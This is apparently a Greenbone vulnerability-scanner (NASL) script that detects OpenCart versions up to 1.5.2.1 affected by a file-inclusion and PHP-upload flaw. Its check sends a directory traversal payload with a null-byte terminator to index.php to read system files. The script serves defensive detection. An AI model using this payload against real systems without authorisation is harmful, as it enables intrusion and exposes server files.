# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:opencart:opencart";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802751");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"6.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-04-18 18:47:56 +0530 (Wed, 18 Apr 2012)");

  script_name("OpenCart <= 1.5.2.1 Multiple Vulnerabilities");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_opencart_http_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("opencart/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"OpenCart is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaws are due to

  - An input passed via the 'route' parameter to index.php is not properly verified before being
  used to include files.

  - 'admin/controller/catalog/download.php' script does not properly validate uploaded files, which
  can be exploited to execute arbitrary PHP code by uploading a PHP file with an appended '.jpg'
  file extension.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to upload PHP scripts
  and include arbitrary files from local resources via directory traversal attacks.");

  script_tag(name:"affected", value:"OpenCart version 1.5.2.1 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/48762");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52957");
  script_xref(name:"URL", value:"http://www.waraxe.us/advisory-84.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522240");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

files = traversal_files();

foreach file (keys(files)) {
  url = dir + "/index.php?route=" + crap(data:"..%5C", length:3*15) + files[file] + "%00";
  if(http_vuln_check(port:port, url:url, pattern:file, check_header:TRUE)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
